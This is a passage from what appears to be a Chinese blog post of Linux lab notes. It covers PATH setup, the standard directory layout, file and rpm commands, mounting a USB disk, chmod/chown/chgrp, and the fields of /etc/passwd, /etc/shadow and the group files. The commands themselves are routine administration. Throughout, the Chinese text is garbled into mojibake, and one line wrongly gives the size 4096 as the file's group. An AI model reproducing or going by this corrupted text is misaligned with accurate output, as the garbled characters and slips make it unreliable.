çš„ç»“æœï¼Œæ£€æŸ¥PATHå˜é‡è®¾ç½®æ•ˆæœï¼›å…³é—­å½“å‰ç»ˆç«¯ï¼Œå†æ¬¡å¯åŠ¨ä¸€ä¸ªç»ˆç«¯ï¼Œæ£€æŸ¥PATHå˜é‡æ˜¯å¦è¿˜æœ‰è·¯å¾„â€œ&#x2F;opt&#x2F;arm-linux&#x2F;binâ€ã€‚</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps48.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps49.jpg" alt="img"></p></li><li><p>æ–°å»ºç›®å½•â€œ&#x2F;opt&#x2F;binâ€ï¼Œä½¿ç”¨å…¨å±å¹•ç¼–è¾‘å·¥å…·viä¿®æ”¹ç³»ç»Ÿç¯å¢ƒé…ç½®æ–‡ä»¶ä¸­PATHå˜é‡è®¾ç½®ï¼Œä½¿å¾—æ–°ä¿®æ”¹åçš„PATHå˜é‡æ–°å¢è·¯å¾„â€œ&#x2F;opt&#x2F;binâ€ï¼Œè¦æ±‚ä¿®æ”¹åçš„PATHè·¯å¾„å¯¹æ¯ä¸ªç”¨æˆ·éƒ½èƒ½ç”Ÿæ•ˆã€‚ä¿å­˜åæ³¨é”€å½“å‰ç”¨æˆ·ç™»å½•ï¼Œå¹¶ä½¿ç”¨rootå¸å·é‡æ–°ç™»é™†ä¸€æ¬¡ï¼Œå†æ¬¡å¼€å¯ç»ˆç«¯å¹¶æ£€æŸ¥PATHå˜é‡çš„è·¯å¾„åˆ—è¡¨ä¸­æ˜¯å¦æœ‰æ·»åŠ æ–°çš„è·¯å¾„â€œ&#x2F;opt&#x2F;binâ€ã€‚</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps50.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps51.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps52.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps53.jpg" alt="img"></p></li><li><p>æŠŠå®éªŒ5çš„sdl-image-view.tar.gzä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶viewimageå¤åˆ¶åˆ°&#x2F;opt&#x2F;binï¼Œæµ‹è¯•ä¸€ä¸‹å½“&#x2F;opt&#x2F;binç›®å½•æ·»åŠ åˆ°PATHè·¯å¾„åï¼Œèƒ½å¦åœ¨shellä»»æ„å½“å‰ç›®å½•æ‰§è¡Œè¯¥ç¨‹åº</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps54.jpg" alt="img"></p></li></ol><hr><h1 id="Linuxæ–‡ä»¶ç³»ç»Ÿ"><a href="#Linuxæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="Linuxæ–‡ä»¶ç³»ç»Ÿ"></a>Linuxæ–‡ä»¶ç³»ç»Ÿ</h1><h2 id="FHS-ç›®å½•æ ‘"><a href="#FHS-ç›®å½•æ ‘" class="headerlink" title="FHS ç›®å½•æ ‘"></a>FHS ç›®å½•æ ‘</h2><p>&#x2F;ï¼šæ ¹ç›®å½•ï¼Œé€šå¸¸ä»¥ç‹¬ç«‹åˆ†åŒºæŒ‚è½½</p><p>&#x2F;binï¼šå‘½ä»¤è¡Œå·¥å…·ï¼Œä¸èƒ½å•ç‹¬æŒ‚è½½ä¸ºä¸€ä¸ªåˆ†åŒº</p><p>&#x2F;bootï¼šlinuxå¯åŠ¨æ–‡ä»¶ï¼ŒåŒ…æ‹¬linuxå†…æ ¸æ–‡ä»¶ä»¥åŠå¯åŠ¨å¼•å¯¼ç¨‹åºçš„é…ç½®æ–‡ä»¶</p><p>&#x2F;devï¼šè®¾å¤‡ä¸å¤–è®¾æ¥å£</p><p>&#x2F;etcï¼šé…ç½®æ–‡ä»¶</p><p>&#x2F;homeï¼šå­˜æ”¾æ‰€æœ‰æ™®é€šç”¨æˆ·ä¸»ç›®å½•çš„ç›®å½•</p><p>&#x2F;libï¼šç³»ç»Ÿå‡½æ•°åº“ï¼Œä¸è¦ä»¥å•ç‹¬çš„åˆ†åŒºæŒ‚è½½æ­¤ç›®å½•</p><p>&#x2F;mediaï¼šå¯ç§»åŠ¨è®¾å¤‡çš„æŒ‚è½½ç‚¹ï¼Œå¦‚è½¯é©±ã€å…‰é©±å’ŒUç›˜</p><p>&#x2F;mntï¼šæŒ‚è½½æŸäº›é¢å¤–è®¾å¤‡</p><p>&#x2F;optï¼šæ”¾ç½®éåŸ linux å‘è¡Œç‰ˆæä¾›çš„ç¬¬ä¸‰æ–¹è½¯ä»¶</p><p>&#x2F;rootï¼šroot ä¸»ç›®å½•ï¼Œéœ€è¦ä¸æ ¹åˆ†åŒºå¤„äºåŒä¸€ç›®å½•</p><p>&#x2F;sbinï¼šç³»ç»Ÿç®¡ç†å‘½ä»¤ï¼Œä¸è¦ä»¥å•ç‹¬çš„åˆ†åŒºæŒ‚è½½æ­¤ç›®å½•</p><p>&#x2F;tmpï¼šä¸´æ—¶æ–‡ä»¶ç›®å½•</p><p>&#x2F;usrï¼šä¸ UNIX æ“ä½œç³»ç»Ÿè½¯ä»¶èµ„æºç›¸å…³çš„ç›®å½•</p><p>&#x2F;varï¼šä¸ç³»ç»Ÿè¿è¡Œè¿‡ç¨‹æœ‰å…³</p><hr><h2 id="æ–‡ä»¶ä¸æ–‡ä»¶ç±»å‹"><a href="#æ–‡ä»¶ä¸æ–‡ä»¶ç±»å‹" class="headerlink" title="æ–‡ä»¶ä¸æ–‡ä»¶ç±»å‹"></a>æ–‡ä»¶ä¸æ–‡ä»¶ç±»å‹</h2><p>â€œä¸€åˆ‡çš†æ–‡ä»¶â€</p><p>æ™®é€šæ–‡ä»¶ã€ç›®å½•æ–‡ä»¶</p><p>è®¾å¤‡æ–‡ä»¶ï¼šç³»ç»ŸæŠŠæ¯ä¸ªI&#x2F;Oè®¾å¤‡éƒ½çœ‹æˆä¸€ä¸ªæ–‡ä»¶ï¼Œé€šå¸¸åœ¨ &#x2F;dev ä¸‹</p><p>é“¾æ¥æ–‡ä»¶ï¼šç¡¬é“¾æ¥ã€è½¯é“¾æ¥</p><p>ç®¡é“æ–‡ä»¶ï¼šå½“ä¸¤ä¸ªè¿›ç¨‹éœ€è¦è¿›è¡Œæ•°æ®ä¸ä¿¡æ¯ä¼ é€’æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç®¡é“æ–‡ä»¶ã€‚å†™å…¥çš„æ•°æ®æ¯æ¬¡éƒ½æ·»åŠ åˆ°ç®¡é“ç¼“å†²åŒºçš„æœ«å°¾ï¼Œè¯»æ•°æ®çš„æ—¶å€™éƒ½æ˜¯ä»ç¼“å†²åŒºçš„å¤´éƒ¨è¯»å‡ºæ•°æ®çš„ï¼Œç®¡é“æ–‡ä»¶é€šå¸¸å»ºç«‹åœ¨å†…å­˜ä¸­</p><hr><h2 id="æ–‡ä»¶ç³»ç»Ÿè®¿é—®-Shell-å‘½ä»¤"><a href="#æ–‡ä»¶ç³»ç»Ÿè®¿é—®-Shell-å‘½ä»¤" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿè®¿é—® Shell å‘½ä»¤"></a>æ–‡ä»¶ç³»ç»Ÿè®¿é—® Shell å‘½ä»¤</h2><p>ä¾æ—§è®°ä¸€äº›å°‘ç”¨çš„</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> æ–‡ä»¶1 æ–‡ä»¶2 æ–‡ä»¶3 ç›®å½•<span class="token function">mv</span> æ–‡ä»¶1 æ–‡ä»¶2 æ–‡ä»¶3 ç›®å½•<span class="token comment"># å¤åˆ¶/ç§»åŠ¨å¤šä¸ªæ–‡ä»¶åˆ°ç›®å½•</span><span class="token function">cp</span> <span class="token parameter variable">-r</span> æºç›®å½• ç›®æ ‡ç›®å½•<span class="token comment"># ä»¥é€’å½’å½¢å¼å¤åˆ¶æ•´ä¸ªç›®å½•çš„æ–‡ä»¶åŠå…¶ä¸‹çº§å­ç›®å½•</span><span class="token function">rm</span> -f/--force<span class="token comment"># ä»ä¸æç¤ºï¼Œç›´æ¥åˆ é™¤</span><span class="token function">rm</span> <span class="token punctuation">[</span>-i/--interactive<span class="token punctuation">]</span><span class="token comment"># äº¤äº’å¼åˆ é™¤ï¼Œç­‰å¾…ç”¨æˆ·ç¡®è®¤ï¼Œéœ€è¦ä¸»åŠ¨è¾“å…¥yè¿›è¡Œç¡®è®¤</span><span class="token function">rm</span> -r/-R/--recursive<span class="token comment"># å°†å‚æ•°ä¸­åˆ—å‡ºçš„å…¨éƒ¨ç›®å½•å’Œå­ç›®å½•å‡é€’å½’åˆ é™¤</span><span class="token function">cat</span> <span class="token operator">></span> filename<span class="token comment"># ä»é”®ç›˜åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œç»“åˆè¾“å‡ºé‡å®šå‘ï¼Œctrl+dç»“æŸè¾“å…¥</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¤åˆ¶ &#x2F;etc&#x2F;fstabã€&#x2F;etc&#x2F;inittab æ–‡ä»¶åˆ° &#x2F;root&#x2F;lab4&#x2F;bak&#x2F; ç›®å½•ï¼š</p><p>å¯ç”¨<code>cp /etc/fstab /etc/inittab /root/lab4/bak/</code></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps12.jpg" alt="img"></p><p>å¤åˆ¶&#x2F;etc&#x2F;passwdæ–‡ä»¶åˆ°&#x2F;root&#x2F;lab4&#x2F;bak&#x2F;ç›®å½•ï¼Œå¹¶æŠŠè¯¥æ–‡ä»¶é‡å‘½åä¸ºpasswd.bkï¼š</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/10.jpg" alt="img"></p><p>ä½¿ç”¨<code>cat &gt; hello.txt</code>å‘½ä»¤å»ºç«‹æ–‡ä»¶hello.txtï¼Œè¾“å…¥5è¡Œè‹±æ–‡ï¼š</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps11.jpg" alt="img"></p><p>æ‰§è¡Œ<code>view /root/lab4/file/hello.txt</code>éªŒè¯æ–‡ä»¶å†…å®¹æ˜¯å¦æ˜¯å‰ä¸€æ­¥è¾“å…¥çš„å†…å®¹ï¼š</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/11.jpg" alt="img"></p><p>æŠŠ&#x2F;root&#x2F;lab4&#x2F;file&#x2F;hello.txtæ–‡ä»¶å¤åˆ¶åˆ°&#x2F;root&#x2F;lab4&#x2F;temp&#x2F;ç›®å½•ï¼š</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/12.jpg" alt="img"></p><p>åˆ é™¤éç©ºç›®å½•&#x2F;root&#x2F;lab4&#x2F;aaï¼š</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps13.jpg" alt="img"></p><p>å¤åˆ¶æ–‡ä»¶ &#x2F;root&#x2F;lab4&#x2F;file&#x2F;hello.txt åˆ° &#x2F;root&#x2F;lab4&#x2F;file&#x2F; ç›®å½•ä¸­å¹¶å‘½åä¸ºhello-new.txtï¼š</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps14.jpg" alt="img"></p><hr><h2 id="ä»rpmåŒ…å®‰è£…tree"><a href="#ä»rpmåŒ…å®‰è£…tree" class="headerlink" title="ä»rpmåŒ…å®‰è£…tree"></a>ä»rpmåŒ…å®‰è£…tree</h2><p>æŠŠæ ‘å½¢ç›®å½•åˆ—è¡¨æ˜¾ç¤ºå·¥å…· tree è½¯ä»¶å®‰è£…åŒ…æ–‡ä»¶ tree-1.5.3-2.el6.i686.rpm é€šè¿‡ winscp å¤åˆ¶åˆ° Linux è™šæ‹Ÿæœºï¼Œè¿›å…¥è¯¥ rpm åŒ…æ‰€åœ¨çš„ç›®å½•ï¼Œæ‰§è¡Œ rpm è½¯ä»¶åŒ…å®‰è£…å‘½ä»¤<code>rpm -ivh tree-1.5.3-2.el6.i686.rpm</code>å®‰è£… tree å·¥å…·è½¯ä»¶åŒ…</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps15.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps16.jpg" alt="img"></p><hr><h2 id="ä½¿ç”¨å¤–éƒ¨å­˜å‚¨è®¾å¤‡"><a href="#ä½¿ç”¨å¤–éƒ¨å­˜å‚¨è®¾å¤‡" class="headerlink" title="ä½¿ç”¨å¤–éƒ¨å­˜å‚¨è®¾å¤‡"></a>ä½¿ç”¨å¤–éƒ¨å­˜å‚¨è®¾å¤‡</h2><p>vmware è¿æ¥Uç›˜åˆ°è™šæ‹Ÿæœºä¸­</p><p>mount æŒ‚è½½</p><p>umount å¸è½½</p><p>è®¾Uç›˜å®‰è£…çš„åŠ è½½ç‚¹ä¸º &#x2F;media&#x2F;KINGSTONï¼Œè¯†åˆ«ä¸º &#x2F;dev&#x2F;sdb1</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">umount</span> /dev/sdb1<span class="token comment"># æˆ–</span><span class="token function">umount</span> /media/KINGSTON<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /mnt/usbdisk<span class="token function">mount</span> <span class="token parameter variable">-t</span> vfat <span class="token parameter variable">-o</span> <span class="token assign-left variable">iocharset</span><span class="token operator">=</span>utf8 /dev/sdb1 /mnt/usbdisk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="æ–‡ä»¶ç³»ç»Ÿæƒé™é…ç½®ä¸ç®¡ç†"><a href="#æ–‡ä»¶ç³»ç»Ÿæƒé™é…ç½®ä¸ç®¡ç†" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿæƒé™é…ç½®ä¸ç®¡ç†"></a>æ–‡ä»¶ç³»ç»Ÿæƒé™é…ç½®ä¸ç®¡ç†</h2><p>Linux æ–‡ä»¶ç³»ç»Ÿæ”¯æŒ UGOï¼ˆUser, Group, Otherï¼‰è®¿é—®æ§åˆ¶æœºåˆ¶</p><p>UGO è®¿é—®æ§åˆ¶æ¨¡å‹é€šè¿‡ç»™linuxç³»ç»Ÿä¸­çš„æ–‡ä»¶èµ‹äºˆä¸¤ä¸ªå±æ€§æ¥èµ·ä½œç”¨ï¼šæ‰€æœ‰è€…å’Œè®¿é—®æƒé™</p><p>æŸ¥çœ‹æ–‡ä»¶æ‰€æœ‰è€…ä¸æ–‡ä»¶æƒé™å±æ€§ï¼š</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241217003804957.png" alt="image-20241217003804957"></p><p>æ–‡ä»¶æƒé™ä½ï¼šdrwxr-xr-xæ–‡ä»¶æ‹¥æœ‰è€…ï¼šrootæ–‡ä»¶æ‰€å±ç»„ï¼š4096</p><br><p>æ–‡ä»¶æƒé™ä½ç¤ºæ„å›¾ï¼š</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241217003306623.png" alt="image-20241217003306623"></p><p>æ–‡ä»¶ç±»å‹ï¼š&quot;-&quot;ä¸ºæ™®é€šæ–‡ä»¶ï¼Œ&quot;d&quot;ä¸ºç›®å½•æ–‡ä»¶ï¼Œ&quot;i&quot;ä¸ºè¿æ¥æ–‡ä»¶ï¼Œ&quot;bâ€ä¸ºå—è®¾å¤‡æ–‡ä»¶ï¼Œ&quot;c&quot;ä¸ºå­—ç¬¦è®¾å¤‡æ–‡ä»¶</p><br><p>æƒé™çš„æ•°å­—è¡¨ç¤ºå½¢å¼ï¼šä½¿ç”¨3ä½å…«è¿›åˆ¶çš„æ•°å­—å½¢å¼è¡¨ç¤ºæŸä¸ªæ–‡ä»¶æˆ–ç›®å½•å®é™…é…ç½®çš„æƒé™</p><p>å¦‚ rwx r-x r-xï¼Œå…¶ä¸­è½¬æ¢è¿›åˆ¶ï¼š</p><p>rwx â€”â€” 111 â€”â€” 7ï¼ˆäºŒè¿›åˆ¶è½¬æ¢ä¸ºå…«è¿›åˆ¶ï¼‰</p><p>r-x â€”â€” 101 â€”â€” 5</p><br><h3 id="æ–‡ä»¶æƒé™è®¾ç½®"><a href="#æ–‡ä»¶æƒé™è®¾ç½®" class="headerlink" title="æ–‡ä»¶æƒé™è®¾ç½®"></a>æ–‡ä»¶æƒé™è®¾ç½®</h3><p>æƒé™ä¿®æ”¹å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token punctuation">[</span>-R<span class="token punctuation">]</span> <span class="token punctuation">[</span>who<span class="token punctuation">]</span> <span class="token punctuation">[</span>+ <span class="token operator">|</span> - <span class="token operator">|</span> <span class="token operator">=</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>mode<span class="token punctuation">]</span> <span class="token operator">&lt;</span>file_name<span class="token operator">></span>/<span class="token operator">&lt;</span>directory_name<span class="token operator">></span><span class="token parameter variable">-R</span> <span class="token comment"># è¡¨ç¤ºé€’å½’è®¾ç½®ï¼Œå³æ•´ä¸ªç›®å½•æ ‘éƒ½ä½¿ç”¨ç›¸åŒçš„æƒé™é…ç½®</span><span class="token function">who</span> <span class="token comment"># è¡¨ç¤ºæ“ä½œå¯¹è±¡ï¼Œæœ‰uï¼ˆuserï¼‰ã€gï¼ˆgroupï¼‰ã€oï¼ˆothersï¼‰ã€aï¼ˆallï¼‰å¯é€‰</span>+ <span class="token comment"># æ·»åŠ æƒé™</span>- <span class="token comment"># å–æ¶ˆæƒé™</span><span class="token operator">=</span> <span class="token comment"># ç›´æ¥èµ‹äºˆç»™å®šçš„æƒé™ï¼Œå–æ¶ˆæ‰€æœ‰ä»¥å‰è®¾ç½®çš„æƒé™</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>æ–‡ä»¶æ‹¥æœ‰è€…ä¿®æ”¹å‘½ä»¤ï¼š</p><p>root ç”¨æˆ·å¯ä»¥ç›´æ¥ä¿®æ”¹æ–‡ä»¶æ‹¥æœ‰è€…</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chown</span> <span class="token punctuation">[</span>-R<span class="token punctuation">]</span> <span class="token operator">&lt;</span>user_name<span class="token operator">></span> <span class="token operator">&lt;</span>directory_name<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><p>æ–‡ä»¶æ‰€åœ¨ç»„ä¿®æ”¹å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chgrp</span> <span class="token punctuation">[</span>-R<span class="token punctuation">]</span> <span class="token operator">&lt;</span>group_name<span class="token operator">></span> <span class="token operator">&lt;</span>file_name<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="Linuxç”¨æˆ·è´¦å·é…ç½®ä¸ç®¡ç†"><a href="#Linuxç”¨æˆ·è´¦å·é…ç½®ä¸ç®¡ç†" class="headerlink" title="Linuxç”¨æˆ·è´¦å·é…ç½®ä¸ç®¡ç†"></a>Linuxç”¨æˆ·è´¦å·é…ç½®ä¸ç®¡ç†</h1><h2 id="è·å–ç™»å½•ç”¨æˆ·è´¦å·ä¿¡æ¯"><a href="#è·å–ç™»å½•ç”¨æˆ·è´¦å·ä¿¡æ¯" class="headerlink" title="è·å–ç™»å½•ç”¨æˆ·è´¦å·ä¿¡æ¯"></a>è·å–ç™»å½•ç”¨æˆ·è´¦å·ä¿¡æ¯</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">id</span><span class="token comment"># æŸ¥çœ‹ç”¨æˆ·è´¦å·ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·UIDã€ä¸»ç»„GIDã€ç”¨æˆ·æ‰€å±ç»„çš„ä¿¡æ¯</span><span class="token function">ps</span> <span class="token parameter variable">-l</span><span class="token comment"># æŸ¥çœ‹å½“å‰æ­£åœ¨è¿è¡Œè¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬å»ºç«‹è¿›ç¨‹çš„UIDã€è¿›ç¨‹PIDå’Œåˆ›å»ºè¯¥è¿›ç¨‹çš„çˆ¶è¿›ç¨‹PPID</span><span class="token function">ls</span> <span class="token parameter variable">-ln</span><span class="token comment"># æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿä¸­æ–‡ä»¶ä¸ç›®å½•çš„æ‹¥æœ‰è€…çš„UIDä¸æ–‡ä»¶æ‰€å¤„çš„ç»„çš„GIDä¿¡æ¯</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç”¨æˆ·"><a href="#ç”¨æˆ·" class="headerlink" title="ç”¨æˆ·"></a>ç”¨æˆ·</h3><p>Linux æ˜¯å¤šç”¨æˆ·å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿï¼Œä»æœ¬åœ°æˆ–ä»è¿œç¨‹ç™»å½•çš„å¤šä¸ªç”¨æˆ·å¯ä»¥åŒæ—¶ä½¿ç”¨åŒä¸€å°è¿è¡Œ Linux æ“ä½œç³»ç»Ÿçš„è®¡ç®—æœº</p><p>Linux ç³»ç»Ÿå†…éƒ¨ä½¿ç”¨ç”¨æˆ·IDï¼ˆUIDï¼‰æ¥è¯†åˆ«ç”¨æˆ·</p><p>åœ¨ Linux ç³»ç»Ÿä¸­æ‰€æœ‰è¿›è¡Œçš„å·¥ä½œéƒ½æ˜¯ä»¥è¿›ç¨‹çš„æ–¹å¼è¿›è¡Œçš„ï¼Œè¿è¡Œçš„ç¨‹åºéƒ½ä½“ç°ä¸ºè¿›ç¨‹</p><p>ç”¨æˆ·è´¦å·åˆ†ä¸ºä¸‰ç±»ï¼š</p><ul><li>è¶…çº§ç”¨æˆ·ï¼šrootï¼ŒUIDä¸º0ï¼ŒGIDä¸º0ï¼Œæœ€é«˜æƒé™</li><li>æ™®é€šç”¨æˆ·ï¼šåªèƒ½ç®¡ç†è‡ªå·±å¯åŠ¨çš„è¿›ç¨‹ï¼Œåªèƒ½æ“ä½œå…¶æ‹¥æœ‰æƒé™çš„æ–‡ä»¶ä¸ç›®å½•ï¼Œé€šå¸¸æ™®é€šç”¨æˆ·é»˜è®¤é…ç½®çš„UIDå€¼ä¸º500~60000</li><li>ç³»ç»Ÿç”¨æˆ·ï¼šä¼ªç”¨æˆ·ï¼Œä¸ç³»ç»ŸæœåŠ¡ç›¸å…³ï¼ŒUIDå€¼ä¸º1~499</li></ul><h3 id="ç”¨æˆ·ç»„"><a href="#ç”¨æˆ·ç»„" class="headerlink" title="ç”¨æˆ·ç»„"></a>ç”¨æˆ·ç»„</h3><p>å…·æœ‰ç›¸åŒç‰¹å¾æˆ–å…·æœ‰æŸç§ç‰¹å®šè”ç³»çš„ç”¨æˆ·çš„é›†åˆï¼Œç”¨äºè¡¨ç¤ºè¯¥ç»„å†…æ‰€æœ‰ç”¨æˆ·çš„è´¦å·ç§°ä¸ºç»„è´¦å·</p><p>Linux ç³»ç»Ÿä¸­æ¯ä¸ªç”¨æˆ·è´¦å·è‡³å°‘å±äºä¸€ä¸ªç”¨æˆ·ç»„ï¼›ä¸€ä¸ªç»„ä¸­å¯ä»¥æœ‰å¤šä¸ªç”¨æˆ·ï¼Œä¸€ä¸ªç”¨æˆ·ä¹Ÿå¯ä»¥å±äºå¤šä¸ªä¸åŒçš„ç»„ï¼›ä¸€ä¸ªç”¨æˆ·åªèƒ½å±äºä¸€ä¸ªä¸»ç»„ï¼Œä½†å¯ä»¥åŒæ—¶å±äºå¤šä¸ªé™„åŠ ç»„</p><p>ä¸»ç»„ï¼šç”¨æˆ·ç™»å½• Linux ç³»ç»Ÿåçš„é»˜è®¤ç»„ï¼Œåœ¨ &#x2F;etc&#x2F;passwd ä¸­çš„ GID å­—æ®µæœ‰è®°è½½ï¼Œç”¨æˆ·çš„ä¸»ç»„å¯ä»¥åˆ‡æ¢ï¼Œä½¿ç”¨<code>newgrp ç»„å</code>ï¼Œåˆ‡æ¢ååŸå…ˆçš„ç»„å˜ä¸ºé™„åŠ ç»„</p><p>ç”¨æˆ·ç»„åˆ†ç±»ï¼š</p><ul><li>æ ‡å‡†ç»„</li><li>ç³»ç»Ÿç»„</li><li>ç§æœ‰ç»„</li></ul><p>å¦‚è¦ä½¿å¤šä¸ªç”¨æˆ·èƒ½æŸ¥çœ‹ã€ä¿®æ”¹æŸä¸€æ–‡ä»¶æˆ–æ‰§è¡ŒæŸä¸ªå‘½ä»¤ï¼Œå¯ä»¥å…ˆæŠŠè¿™äº›ç”¨æˆ·éƒ½å®šä¹‰åˆ°åŒä¸€ç”¨æˆ·ç»„ï¼Œç„¶åä¿®æ”¹æ–‡ä»¶æˆ–ç›®å½•çš„æƒé™ï¼Œè®©æ”¹ç”¨æˆ·ç»„å…·æœ‰ç›¸åº”çš„æƒé™</p><h3 id="ç”¨æˆ·ä¸ç”¨æˆ·ç»„ä¿¡æ¯æ–‡ä»¶"><a href="#ç”¨æˆ·ä¸ç”¨æˆ·ç»„ä¿¡æ¯æ–‡ä»¶" class="headerlink" title="ç”¨æˆ·ä¸ç”¨æˆ·ç»„ä¿¡æ¯æ–‡ä»¶"></a>ç”¨æˆ·ä¸ç”¨æˆ·ç»„ä¿¡æ¯æ–‡ä»¶</h3><ul><li><p>ç”¨æˆ·è´¦å·ä¿¡æ¯ &#x2F;etc&#x2F;passwd</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ç”¨æˆ·å:å£ä»¤ï¼ˆè¯¥å­—æ®µç°å·²ä¸ºxæˆ–*ï¼‰:<span class="token environment constant">UID</span>:GID:æ³¨é‡Šæ€§æè¿°:ä¸»ç›®å½•:ç™»å½•shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216215628084.png" alt="image-20241216215628084"></p></li><li><p>ç”¨æˆ·å¯†ç ä¿¡æ¯åŠå…¶å¯†ç æ—¶é™æ–‡ä»¶ &#x2F;etc&#x2F;shadow</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ç”¨æˆ·å:åŠ å¯†å£ä»¤:å£ä»¤æœ€åä¿®æ”¹æ—¶é—´:å£ä»¤æœ€å°æœ‰æ•ˆå¤©æ•°:å£ä»¤æœ€å¤§æœ‰æ•ˆå¤©æ•°:è­¦å‘Šæ—¶é—´:ä¸æ´»åŠ¨æ—¶é—´:è´¦å·è¿‡æœŸå¤±æ•ˆæ—¶é—´:æ ‡å¿—<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216215831695.png" alt="image-20241216215831695"></p></li><li><p>ç”¨æˆ·ç»„ä¿¡æ¯æ–‡ä»¶ &#x2F;etc&#x2F;group</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ç»„å:å£ä»¤:GID:ç»„å†…æˆå‘˜åˆ—è¡¨<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216220053865.png" alt="image-20241216220053865"></p></li><li><p>ç”¨æˆ·ç»„å¯†ç æ–‡ä»¶ &#x2F;etc&#x2F;gshadow</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ç»„å:å£ä»¤:ç»„ç®¡ç†è€…:ç»„æˆå‘˜<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216220302442.png" alt="image-20241216220302442"></p></li></ul><hr><h2 id="å»ºç«‹ç”¨æˆ·å’Œç”¨æˆ·ç»„è´¦å·"><a href="#å»ºç«‹ç”¨æˆ·å’Œç”¨æˆ·ç»„è´¦å·" class="headerlink" title="å»ºç«‹ç”¨æˆ·å’Œç”¨æˆ·ç»„è´¦å·"></a>å»ºç«‹ç”¨æˆ·å’Œç”¨æˆ·ç»„è´¦å·</h2><p>å»ºç«‹ç”¨æˆ·ç»„</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">groupadd</span> é€‰é¡¹ ç”¨æˆ·ç»„å<span class="token function">groupadd</span> <span class="token parameter variable">-g</span> GID ç”¨æˆ·ç»„å<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å»ºç«‹ç”¨æˆ·è´¦å·å¹¶è®¾å®šç™»å½•å¯†ç </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">useradd</span> é€‰é¡¹ ç”¨æˆ·å<span class="token parameter variable">-u</span> <span class="token environment constant">UID</span> <span class="token comment"># æŒ‡å®šç”¨æˆ·è´¦å·å¯¹åº”çš„UID</span><span class="token parameter variable">-g</span> ç»„å <span class="token comment"># æŒ‡å®šç”¨æˆ·è´¦å·çš„åˆå§‹é»˜è®¤ç»„</span><span class="token parameter variable">-G</span> ç»„å1ï¼Œç»„å2ï¼Œç»„å3ï¼Œ<span class="token punctuation">..</span>. <span class="token comment"># æŒ‡å®šç”¨æˆ·æ‰€å±çš„é™„åŠ 